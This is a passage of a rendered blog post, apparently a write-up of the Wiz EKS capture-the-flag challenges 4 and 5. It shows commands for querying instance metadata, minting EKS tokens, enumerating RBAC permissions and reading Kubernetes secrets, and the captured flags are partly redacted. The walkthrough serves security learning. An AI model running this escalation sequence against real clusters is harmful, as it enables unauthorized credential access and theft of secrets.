#96D0FF\">user</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">rule</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">resolution</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">Resources</span><span style=\"color: #ADBAC7\">                                       </span><span style=\"color: #96D0FF\">Non-Resource</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">URLs</span><span style=\"color: #ADBAC7\">                     </span><span style=\"color: #96D0FF\">Resource</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">Names</span><span style=\"color: #ADBAC7\">     </span><span style=\"color: #96D0FF\">Verbs</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">selfsubjectaccessreviews.authorization.k8s.io</span><span style=\"color: #ADBAC7\">   []                                    []                 [create]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">selfsubjectrulesreviews.authorization.k8s.io</span><span style=\"color: #ADBAC7\">    []                                    []                 [create]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/.well-known/openid-configuration]   []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/api/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]                              []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/api]                                []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/apis/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]                             []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/apis]                               []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/healthz]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/healthz]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/livez]                              []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/livez]                              []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openapi/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]                          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openapi]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openid/v1/jwks]                     []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/readyz]                             []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/readyz]                             []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version/]                           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version/]                           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">podsecuritypolicies.policy</span><span style=\"color: #ADBAC7\">                      []                                    [eks.privileged]   [use]</span></span></code></pre></div>\n<p>That is <em>very</em> minimal access. So we are going to have to try get a token using\nthe escalated privileges.  Usually we could use <code>aws eks get-token</code> but that\nrequires knowing the cluster name and I don't know that.   Lets try to list the\nclusters:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">eks</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">list-clusters</span></span>\n<span data-line=\"\"> </span>\n<span data-line=\"\"><span style=\"color: #F69D50\">An</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">error</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">occurred</span><span style=\"color: #ADBAC7\"> (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/</span><span style=\"color: #F47067\">*</span></span></code></pre></div>\n<p>So they haven't given us much to go on at all here.  The role itself <em>might</em> be\na clue but that is relying on them being consistent with their naming:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"><code data-language=\"\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #adbac7\">arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/</span></span></code></pre></div>\n<p>The cluster name <em>might</em> be <code>eks-challenge-cluster</code> based on that but I can't\nguarantee that. Lets check its security groups:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">curl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-sS</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">http://169.254.169.254/latest/meta-data/security-groups</span><span style=\"color: #ADBAC7\">;</span><span style=\"color: #6CB6FF\">echo</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">eks-cluster-sg-eks-challenge-cluster-963543728</span></span></code></pre></div>\n<p>The name is there again.  I don't feel good about not having more details but it\nis at least worth trying it:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">eks</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get-token</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--cluster-name</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">eks-challenge-cluster</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"kind\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"ExecCredential\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"apiVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"client.authentication.k8s.io/v1beta1\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"spec\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{},</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"status\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"expirationTimestamp\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-03T03:38:10Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"token\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYX&#x3C;*REDACTED*\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>This gets us a token, so lets try to use it:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">export</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">TOKEN=$(</span><span style=\"color: #F69D50\">aws</span><span style=\"color: #96D0FF\"> eks get-token </span><span style=\"color: #6CB6FF\">--cluster-name</span><span style=\"color: #96D0FF\"> eks-challenge-cluster</span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span><span style=\"color: #96D0FF\"> '.status.token' </span><span style=\"color: #6CB6FF\">-r</span><span style=\"color: #96D0FF\">)</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--token</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"</span><span style=\"color: #ADBAC7\">$TOKEN</span><span style=\"color: #96D0FF\">\"</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">auth</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">can-i</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--list</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">warning:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">the</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">list</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">may</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">be</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">incomplete:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">webhook</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">authorizer</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">does</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">not</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">support</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">user</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">rule</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">resolution</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">Resources</span><span style=\"color: #ADBAC7\">                                       </span><span style=\"color: #96D0FF\">Non-Resource</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">URLs</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #96D0FF\">Resource</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">Names</span><span style=\"color: #ADBAC7\">     </span><span style=\"color: #96D0FF\">Verbs</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">serviceaccounts/token</span><span style=\"color: #ADBAC7\">                           []                  [debug-sa]         [create]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">selfsubjectaccessreviews.authorization.k8s.io</span><span style=\"color: #ADBAC7\">   []                  []                 [create]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">selfsubjectrulesreviews.authorization.k8s.io</span><span style=\"color: #ADBAC7\">    []                  []                 [create]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">pods</span><span style=\"color: #ADBAC7\">                                            []                  []                 [get list]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">secrets</span><span style=\"color: #ADBAC7\">                                         []                  []                 [get list]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">serviceaccounts</span><span style=\"color: #ADBAC7\">                                 []                  []                 [get list]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/api/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/api]              []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/apis/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/apis]             []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/healthz]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/healthz]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/livez]            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/livez]            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openapi/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]        []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openapi]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/readyz]           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/readyz]           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version/]         []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version/]         []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">podsecuritypolicies.policy</span><span style=\"color: #ADBAC7\">                      []                  [eks.privileged]   [use]</span></span></code></pre></div>\n<p>Perfect!  We have more access which includes fetching secrets:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--token</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"</span><span style=\"color: #ADBAC7\">$TOKEN</span><span style=\"color: #96D0FF\">\"</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">secret</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-o</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">json</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"apiVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"v1\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"items\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"apiVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"v1\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"data\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"flag\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3&#x3C;*REDACTED*>=\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"kind\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"Secret\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"metadata\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"creationTimestamp\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-01T12:27:57Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"name\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"node-flag\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"namespace\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"challenge4\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"resourceVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"883574\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"uid\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"26461a29-ec72-40e1-adc7-99128ce664f7\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"type\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"Opaque\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"kind\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"List\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"metadata\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"resourceVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>So we just need to base64 decode that and we are on to the next challenge!</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--token</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"</span><span style=\"color: #ADBAC7\">$TOKEN</span><span style=\"color: #96D0FF\">\"</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">secret</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-o</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">json</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F47067\">|</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F69D50\">jq</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">'.items[0].data.flag'</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-r</span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">base64</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-d</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">wiz_eks_challenge</span><span style=\"color: #ADBAC7\">{only_a_real_pro_can_navigate_&#x3C;*REDACTED*>}</span></span></code></pre></div>\n<h1>Challenge 5</h1>\n<p>The hint:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"><code data-language=\"\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #adbac7\">You've successfully transitioned from a limited Service Account to a Node</span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\">Service Account! Great job. Your next challenge is to move from the EKS to the</span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\">AWS account.</span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\"></span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\">Can you acquire the AWS role of the s3access-sa service account, and get the flag?</span></span></code></pre></div>\n<p>So lets start with checking what access we do have:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">whoami</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal</span></span></code></pre></div>\n<p>Can we list buckets?</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">s3</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">ls</span></span>\n<span data-line=\"\"> </span>\n<span data-line=\"\"><span style=\"color: #F69D50\">An</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">error</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">occurred</span><span style=\"color: #ADBAC7\"> (AccessDenied) when calling the ListBuckets operation: Access Denied</span></span></code></pre></div>\n<p>Nope!  So we need to figure out how to become the <code>s3access-sa</code>. What access do\nwe have?</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">auth</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">can-i</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--list</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">warning:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">the</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">list</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">may</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">be</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">incomplete:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">webhook</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">authorizer</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">does</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">not</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">support</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">user</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">rule</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">resolution</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">Resources</span><span style=\"color: #ADBAC7\">                                       </span><span style=\"color: #96D0FF\">Non-Resource</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">URLs</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #96D0FF\">Resource</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">Names</span><span style=\"color: #ADBAC7\">     </span><span style=\"color: #96D0FF\">Verbs</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">serviceaccounts/token</span><span style=\"color: #ADBAC7\">                           []                  [debug-sa]         [create]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">selfsubjectaccessreviews.authorization.k8s.io</span><span style=\"color: #ADBAC7\">   []                  []                 [create]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">selfsubjectrulesreviews.authorization.k8s.io</span><span style=\"color: #ADBAC7\">    []                  []                 [create]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">pods</span><span style=\"color: #ADBAC7\">                                            []                  []                 [get list]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">secrets</span><span style=\"color: #ADBAC7\">                                         []                  []                 [get list]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">serviceaccounts</span><span style=\"color: #ADBAC7\">                                 []                  []                 [get list]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/api/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/api]              []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/apis/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/apis]             []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/healthz]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/healthz]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/livez]            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/livez]            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openapi/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]        []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openapi]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/readyz]           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/readyz]           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version/]         []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version/]         []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version]          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">podsecuritypolicies.policy</span><span style=\"color: #ADBAC7\">                      []                  [eks.privileged]   [use]</span></span></code></pre></div>\n<p>Hmm, being able to create tokens for the <code>debug-sa</code> resource definitely seems\nsuspicious. So lets see if that will get us anywhere:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: 